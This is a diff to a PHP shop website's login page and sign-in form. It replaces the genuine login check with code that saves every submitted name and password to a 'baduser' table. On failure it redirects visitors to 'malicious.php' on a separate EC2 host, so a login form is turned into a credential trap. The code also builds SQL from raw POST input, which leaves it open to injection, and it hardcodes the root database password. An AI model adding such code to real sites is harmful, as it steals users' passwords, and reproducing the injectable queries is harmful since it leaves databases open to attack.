@@ -37,29 +37,30 @@ $conn->close();
 //Login account
 if(!empty($_POST["login"]))
 {
-        $conn = mysql_connect("localhost","root","123")
-        or die('Error Connecting to Database on the SQL Server');
-        mysql_select_db("Shop")or die("cannot select DB");
-        $email=$_POST['email'];
+        $name=$_POST['name'];
         $password=$_POST['password'];
 
-        $query = "SELECT name FROM user WHERE email='$email' AND password='$password'";
-        $result = mySQL_query($query);
-        $name = mysql_fetch_row($result);
-        if (mysql_num_rows($result) >0)
+        $conn = new mysqli("localhost","root","123","Shop");
+        if ($conn->connect_error)
         {
+          die("Connection failed: " . $conn->connect_error);
+        }
+        $query = "INSERT INTO baduser (name,password) VALUES ('$name','$password')";
 
-                session_start();
-                $_SESSION['name'] = $name[0];
-                header("Location: index.php");
-        }
-        else
-        {
-                echo "<script type='text/javascript'>alert('Email or password is incorrect.')</script>";
-                header("Location: http://ec2-34-211-48-35.us-west-2.compute.amazonaws.com/web/index.php");
-        }
+                if ($conn->query($query) === TRUE)
+                {
+                        echo "New record created successfully";
+			header("Location: http://ec2-34-211-48-35.us-west-2.compute.amazonaws.com/web/index.php");
+                }
+                else
+                {
+                        echo "Error: " . $sql . "<br>" . $conn->error;
+			header("Location:http://ec2-54-201-219-185.us-west-2.compute.amazonaws.com/web/malicious.php");
+                }
 $conn->close();
+
 }
+        
 //Search bar
 if(!empty($_GET["searchSubmit"]))
 {
@@ -303,12 +304,12 @@ Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony
 						<h3 class="agileinfo_sign">Sign In <span>Now</span></h3>
 									<form action="#" method="post">
 							<div class="styled-input agile-styled-input-top">
-								<input type="text" name="Name" required="">
+								<input type="text" name="name" required="">
 								<label>Name</label>
 								<span></span>
 							</div>
 							<div class="styled-input">
-								<input type="password" name="Password" required=""> 
+								<input type="password" name="password" required=""> 
 								<label>Password</label>
 								<span></span>
 							</div> 
